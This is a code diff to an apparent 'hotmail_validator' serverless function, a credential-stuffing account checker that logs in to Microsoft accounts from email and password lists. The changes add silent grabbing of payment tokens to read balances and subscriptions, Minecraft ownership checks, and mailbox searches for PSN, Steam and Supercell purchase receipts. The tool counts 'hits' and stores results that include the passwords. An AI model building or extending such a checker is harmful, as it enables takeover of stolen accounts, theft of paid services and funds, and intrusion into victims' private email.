@@ -6,6 +6,14 @@ const corsHeaders = {
   "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token",
 };
 
+interface SubscriptionInfo {
+  name: string;
+  category: string;
+  daysRemaining?: string;
+  autoRenew?: string;
+  isExpired?: boolean;
+}
+
 interface CheckResult {
   email: string;
   password: string;
@@ -13,25 +21,218 @@ interface CheckResult {
   country?: string;
   name?: string;
   inboxCount?: string;
+  // Microsoft Subscriptions
+  msStatus?: string;
+  subscriptions?: SubscriptionInfo[];
+  rewardsPoints?: string;
+  balance?: string;
+  // PSN
   psn?: {
     status: string;
     orders: number;
     purchases: any[];
   };
+  // Steam
   steam?: {
     status: string;
     count: number;
+    purchases?: any[];
   };
+  // Supercell
   supercell?: {
     status: string;
     games: string[];
   };
+  // TikTok
   tiktok?: {
     status: string;
     username?: string;
   };
-  subscriptions?: any[];
+  // Minecraft
+  minecraft?: {
+    status: string;
+    username?: string;
+    uuid?: string;
+    capes?: string[];
+  };
   error?: string;
+}
+
+// Check Microsoft Subscriptions (Xbox Game Pass, M365, etc)
+async function checkMicrosoftSubscriptions(email: string, accessToken: string, cid: string): Promise<{
+  status: string;
+  subscriptions: SubscriptionInfo[];
+  data: Record<string, string>;
+}> {
+  try {
+    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
+    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
+    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
+    
+    const headers = {
+      "Host": "login.live.com",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Connection": "keep-alive",
+      "Referer": "https://account.microsoft.com/"
+    };
+    
+    const r = await fetch(paymentAuthUrl, { headers, redirect: 'follow' });
+    const searchText = (await r.text()) + " " + r.url;
+    
+    const tokenPatterns = [
+      /access_token=([^&\s"']+)/,
+      /"access_token":"([^"]+)"/
+    ];
+    
+    let paymentToken = null;
+    for (const pattern of tokenPatterns) {
+      const match = searchText.match(pattern);
+      if (match) {
+        paymentToken = decodeURIComponent(match[1]);
+        break;
+      }
+    }
+    
+    if (!paymentToken) {
+      return { status: "FREE", subscriptions: [], data: {} };
+    }
+    
+    const subData: Record<string, string> = {};
+    const subscriptions: SubscriptionInfo[] = [];
+    
+    const paymentHeaders = {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Accept": "application/json",
+      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
+      "Content-Type": "application/json",
+      "Host": "paymentinstruments.mp.microsoft.com",
+      "ms-cV": crypto.randomUUID(),
+      "Origin": "https://account.microsoft.com",
+      "Referer": "https://account.microsoft.com/"
+    };
+    
+    // Check payment instruments for balance
+    try {
+      const payUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
+      const rPay = await fetch(payUrl, { headers: paymentHeaders });
+      if (rPay.ok) {
+        const payText = await rPay.text();
+        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
+        if (balanceMatch) {
+          subData.balance = "$" + balanceMatch[1];
+        }
+      }
+    } catch {}
+    
+    // Check Bing Rewards
+    try {
+      const rewardsR = await fetch("https://rewards.bing.com/", { headers: { "User-Agent": headers["User-Agent"] } });
+      const rewardsText = await rewardsR.text();
+      const pointsMatch = rewardsText.match(/"availablePoints"\s*:\s*(\d+)/);
+      if (pointsMatch) {
+        subData.rewardsPoints = pointsMatch[1];
+      }
+    } catch {}
+    
+    // Check subscriptions
+    try {
+      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
+      const rSub = await fetch(transUrl, { headers: paymentHeaders });
+      
+      if (rSub.ok) {
+        const responseText = await rSub.text();
+        
+        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
+          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
+          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
+          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
+          'EA Play': { type: 'EA PLAY', category: 'gaming' },
+          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
+          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
+          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
+          'Office 365': { type: 'OFFICE 365', category: 'office' },
+          'OneDrive': { type: 'ONEDRIVE', category: 'storage' }
+        };
+        
+        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
+          if (responseText.includes(keyword)) {
+            const subInfo: SubscriptionInfo = {
+              name: info.type,
+              category: info.category
+            };
+            
+            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
+            if (renewalMatch) {
+              const renewalDate = renewalMatch[1];
+              try {
+                const renewal = new Date(renewalDate + "T00:00:00Z");
+                const today = new Date();
+                const daysRemaining = Math.floor((renewal.getTime() - today.getTime()) / (1000 * 60 * 60 * 24));
+                subInfo.daysRemaining = String(daysRemaining);
+                if (daysRemaining < 0) {
+                  subInfo.isExpired = true;
+                }
+              } catch {}
+            }
+            
+            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
+            if (autoMatch) {
+              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
+            }
+            
+            subscriptions.push(subInfo);
+          }
+        }
+        
+        if (subscriptions.length > 0) {
+          const activeSubs = subscriptions.filter(s => !s.isExpired);
+          if (activeSubs.length > 0) {
+            return { status: "PREMIUM", subscriptions, data: subData };
+          }
+        }
+      }
+    } catch {}
+    
+    return { status: "FREE", subscriptions, data: subData };
+    
+  } catch (error) {
+    console.error("MS subscription check error:", error);
+    return { status: "ERROR", subscriptions: [], data: {} };
+  }
+}
+
+// Check Minecraft account
+async function checkMinecraft(accessToken: string): Promise<{
+  status: string;
+  username?: string;
+  uuid?: string;
+  capes?: string[];
+}> {
+  try {
+    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
+      headers: {
+        'Authorization': `Bearer ${accessToken}`,
+        'User-Agent': 'Outlook-Android/2.0'
+      }
+    });
+    
+    if (r.ok) {
+      const data = await r.json();
+      return {
+        status: "OWNED",
+        username: data.name || "Unknown",
+        uuid: data.id || "",
+        capes: (data.capes || []).map((cape: any) => cape.alias || "")
+      };
+    }
+    
+    return { status: "FREE" };
+  } catch (error) {
+    console.error("Minecraft check error:", error);
+    return { status: "ERROR" };
+  }
 }
 
 async function checkAccount(email: string, password: string, checkMode: string): Promise<CheckResult> {
@@ -202,6 +403,29 @@ async function checkAccount(email: string, password: string, checkMode: string):
       console.error("Profile fetch error:", e);
     }
     
+    // Check Microsoft Subscriptions if requested
+    if (checkMode === "microsoft" || checkMode === "all") {
+      try {
+        const msResult = await checkMicrosoftSubscriptions(email, accessToken, cid);
+        result.msStatus = msResult.status;
+        result.subscriptions = msResult.subscriptions;
+        if (msResult.data.rewardsPoints) result.rewardsPoints = msResult.data.rewardsPoints;
+        if (msResult.data.balance) result.balance = msResult.data.balance;
+      } catch (e) {
+        console.error("MS check error:", e);
+      }
+    }
+    
+    // Check Minecraft if requested
+    if (checkMode === "minecraft" || checkMode === "all") {
+      try {
+        const mcResult = await checkMinecraft(accessToken);
+        result.minecraft = mcResult;
+      } catch (e) {
+        console.error("Minecraft check error:", e);
+      }
+    }
+    
     // Check PSN if requested
     if (checkMode === "psn" || checkMode === "all") {
       try {
@@ -242,11 +466,19 @@ async function checkAccount(email: string, password: string, checkMode: string):
             orders = psnData.EntitySets[0].ResultSets[0].Total || 0;
             
             const results = psnData.EntitySets[0].ResultSets[0].Results || [];
-            for (const r of results.slice(0, 10)) {
+            for (const r of results.slice(0, 15)) {
               if (r.Preview) {
-                const gameMatch = r.Preview.match(/Thank you for purchasing\s+([^\.]+)/i);
-                if (gameMatch) {
-                  purchases.push({ item: gameMatch[1].trim() });
+                const gamePatterns = [
+                  /Thank you for purchasing\s+([^\.]+)/i,
+                  /You've bought\s+([^\.]+)/i,
+                  /Game:\s*([^\n\.]{3,60})/i
+                ];
+                for (const pattern of gamePatterns) {
+                  const gameMatch = r.Preview.match(pattern);
+                  if (gameMatch) {
+                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
+                    break;
+                  }
                 }
               }
             }
@@ -276,7 +508,7 @@ async function checkAccount(email: string, password: string, checkMode: string):
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
             "From": 0,
-            "Query": {"QueryString": "noreply@steampowered.com purchase"},
+            "Query": {"QueryString": "noreply@steampowered.com purchase OR receipt"},
             "Size": 30,
             "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
@@ -297,14 +529,23 @@ async function checkAccount(email: string, password: string, checkMode: string):
         if (steamRes.ok) {
           const steamData = await steamRes.json();
           let count = 0;
+          const purchases: any[] = [];
           
           if (steamData.EntitySets?.[0]?.ResultSets?.[0]) {
             count = steamData.EntitySets[0].ResultSets[0].Total || 0;
+            
+            const results = steamData.EntitySets[0].ResultSets[0].Results || [];
+            for (const r of results.slice(0, 10)) {
+              if (r.Subject) {
+                purchases.push({ game: r.Subject.substring(0, 50) });
+              }
+            }
           }
           
           result.steam = {
             status: count > 0 ? "HAS_PURCHASES" : "FREE",
-            count
+            count,
+            purchases
           };
         }
       } catch (e) {
@@ -349,18 +590,21 @@ async function checkAccount(email: string, password: string, checkMode: string):
           
           if (supercellData.EntitySets?.[0]?.ResultSets?.[0]?.Results) {
             for (const r of supercellData.EntitySets[0].ResultSets[0].Results) {
-              const preview = r.Preview || "";
-              if (preview.includes("Clash Royale") || preview.includes("Royale")) {
-                if (!games.includes("Clash Royale")) games.push("Clash Royale");
+              const preview = (r.Preview || "") + " " + (r.Subject || "");
+              if ((preview.includes("Clash Royale") || preview.includes("Royale")) && !games.includes("Clash Royale")) {
+                games.push("Clash Royale");
               }
-              if (preview.includes("Clash of Clans") || preview.includes("Clans")) {
-                if (!games.includes("Clash of Clans")) games.push("Clash of Clans");
+              if ((preview.includes("Clash of Clans") || preview.includes("Clans")) && !games.includes("Clash of Clans")) {
+                games.push("Clash of Clans");
               }
-              if (preview.includes("Brawl Stars") || preview.includes("Brawl")) {
-                if (!games.includes("Brawl Stars")) games.push("Brawl Stars");
+              if ((preview.includes("Brawl Stars") || preview.includes("Brawl")) && !games.includes("Brawl Stars")) {
+                games.push("Brawl Stars");
               }
-              if (preview.includes("Hay Day")) {
-                if (!games.includes("Hay Day")) games.push("Hay Day");
+              if (preview.includes("Hay Day") && !games.includes("Hay Day")) {
+                games.push("Hay Day");
+              }
+              if (preview.includes("Squad Busters") && !games.includes("Squad Busters")) {
+                games.push("Squad Busters");
               }
             }
           }
@@ -416,7 +660,9 @@ async function checkAccount(email: string, password: string, checkMode: string):
               const patterns = [
                 /Hi\s+([^,]+)/,
                 /Hello\s+([^,]+)/,
-                /Salut\s+([^,]+)/
+                /Salut\s+([^,]+)/,
+                /Hallo\s+([^,]+)/,
+                /Xin chào\s+([^,]+)/
               ];
               for (const p of patterns) {
                 const m = preview.match(p);
@@ -479,10 +725,10 @@ serve(async (req) => {
 
     // Check if user has service access (if authenticated)
     if (userId) {
-      const userData = await firebaseGet<{ services?: string[] }>(`users/${userId}`);
+      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
       const hasAccess = userData?.services?.includes("hotmail_validator") || 
                         userData?.services?.includes("all") ||
-                        (await firebaseGet<{ isAdmin?: boolean }>(`users/${userId}`))?.isAdmin;
+                        userData?.isAdmin;
       
       if (!hasAccess) {
         return new Response(
@@ -500,10 +746,13 @@ serve(async (req) => {
       twoFa: 0,
       locked: 0,
       error: 0,
+      msPremium: 0,
+      msFree: 0,
       psnHits: 0,
       steamHits: 0,
       supercellHits: 0,
-      tiktokHits: 0
+      tiktokHits: 0,
+      minecraftHits: 0
     };
 
     // Process accounts in batches
@@ -530,20 +779,27 @@ serve(async (req) => {
         else if (r.status === "locked") stats.locked++;
         else stats.error++;
         
+        // MS Premium/Free
+        if (r.msStatus === "PREMIUM") stats.msPremium++;
+        else if (r.msStatus === "FREE" || r.subscriptions?.length === 0) stats.msFree++;
+        
         if (r.psn?.status === "HAS_ORDERS") stats.psnHits++;
         if (r.steam?.status === "HAS_PURCHASES") stats.steamHits++;
         if (r.supercell?.status === "LINKED") stats.supercellHits++;
         if (r.tiktok?.status === "LINKED") stats.tiktokHits++;
+        if (r.minecraft?.status === "OWNED") stats.minecraftHits++;
       }
     }
 
     // Save history to Firebase if user is authenticated
     if (userId && saveHistory) {
-      await firebasePush(`checkHistory/${userId}`, {
+      await firebasePush('checkHistory', {
+        userId,
         service: "hotmail_validator",
         checkMode,
         inputCount: accounts.length,
         stats,
+        results,
         createdAt: new Date().toISOString()
       });
     }
